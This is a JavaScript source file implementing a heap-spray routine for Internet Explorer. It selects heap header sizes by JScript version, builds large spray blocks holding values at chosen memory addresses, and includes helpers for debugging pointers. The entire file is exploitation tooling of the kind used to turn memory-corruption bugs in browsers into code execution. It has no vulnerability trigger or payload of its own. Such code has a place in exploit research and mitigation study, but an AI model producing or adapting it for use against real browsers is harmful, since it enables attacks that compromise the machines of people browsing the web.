console = window.console || {"log": function(){}};
function bad(pAddress) {
  // convert a valid 32-bit pointer to an invalid one that is easy to convert
  // back. Useful for debugging: use a bad pointer, get an AV whenever it is
  // used, then fix pointer and continue with exception handled to have see what
  // happens next.
  return 0x80000000 + pAddress;
}
function blanket(dSpray_dwValue_pAddress, pAddress) {
  // Can be used to store values that indicate offsets somewhere in the heap
  // spray. Useful for debugging: blanket region, get an AV at an address
  // that indicates where the pointer came from. Does not overwrite addresses
  // at which data is already stored.
  for (var uOffset = 0; uOffset < 0x40; uOffset += 4) {
    if (!((pAddress + uOffset) in dSpray_dwValue_pAddress)) {
      dSpray_dwValue_pAddress[pAddress + uOffset] = bad(((pAddress & 0xFFF) << 16) + uOffset);
    }
  }
}
var guSprayBlockSize = 0x02000000; // how much fragmentation do you want?
var guSprayPageSize  = 0x00001000; // block alignment.

// Different versions of MSIE have different heap header sizes:
var sJSVersion;
try{
  /*@cc_on @*/
  sJSVersion = eval("@_jscript_version");
} catch(e) {
  sJSVersion = "unknown"
};
var guHeapHeaderSize = {
    "5.8": 0x24,
    "9": 0x10, // MSIE9
    "unknown": 0x10
}[sJSVersion]; // includes BSTR length
var guHeapFooterSize = 0x04;
if (!guHeapHeaderSize)
    throw new Error("Unknown script version " + sJSVersion);

function createSprayBlock(dSpray_dwValue_pAddress) {
  // Create a spray "page" and store spray data at the right offset.
  var sSprayPage = "\uDEAD".repeat(guSprayPageSize >> 1);
  for (var pAddress in dSpray_dwValue_pAddress) {
    sSprayPage = sSprayPage.replaceDWord(pAddress % guSprayPageSize, dSpray_dwValue_pAddress[pAddress]);
  }
  // Create a spray "block" by concatinated copies of the spray "page", taking into account the header and footer
  // used by MSIE for larger heap allocations.
  var uSprayPagesPerBlock = Math.ceil(guSprayBlockSize / guSprayPageSize);
  var sSprayBlock = (
    sSprayPage.substr(guHeapHeaderSize >> 1) +
    sSprayPage.repeat(uSprayPagesPerBlock - 2) +
    sSprayPage.substr(0, sSprayPage.length - (guHeapFooterSize >> 1))
  );
  var uActualSprayBlockSize = guHeapHeaderSize + sSprayBlock.length * 2 + guHeapFooterSize;
  if (uActualSprayBlockSize != guSprayBlockSize)
      throw new Error("Assertion failed: spray block (" + uActualSprayBlockSize.toString(16) + ") should be " + guSprayBlockSize.toString(16) + ".");
  console.log("createSprayBlock():");
  console.log("  sSprayPage.length: " + sSprayPage.length.toString(16));
  console.log("  uSprayPagesPerBlock: " + uSprayPagesPerBlock.toString(16));
  console.log("  sSprayBlock.length: " + sSprayBlock.length.toString(16));
  return sSprayBlock;
}
function getHeapBlockIndexForAddress(pAddress) {
  return ((pAddress % guSprayPageSize) - guHeapHeaderSize) >> 1;
}
function getSprayBlockCount(dSpray_dwValue_pAddress, pStartAddress) {
  pStartAddress = pStartAddress || 0;
  var pTargetAddress = 0x0;
  for (var pAddress in dSpray_dwValue_pAddress) {
    pTargetAddress = Math.max(pTargetAddress, pAddress);
  }
  uSprayBlocksCount = Math.ceil((pTargetAddress - pStartAddress) / guSprayBlockSize);
  console.log("getSprayBlockCount():");
  console.log("  pTargetAddress: " + pTargetAddress.toString(16));
  console.log("  uSprayBlocksCount: " + uSprayBlocksCount.toString(16));
  return uSprayBlocksCount;
}
function sprayHeap(dSpray_dwValue_pAddress, pStartAddress) {
  var uSprayBlocksCount = getSprayBlockCount(dSpray_dwValue_pAddress, pStartAddress);
  // Spray the heap by making copies of the spray "block".
  var asSpray = new Array(uSprayBlocksCount);
  asSpray[0] = createSprayBlock(dSpray_dwValue_pAddress);
  for (var uIndex = 1; uIndex < asSpray.length; uIndex++) {
    asSpray[uIndex] = asSpray[0].clone();
  }
  return asSpray;
}
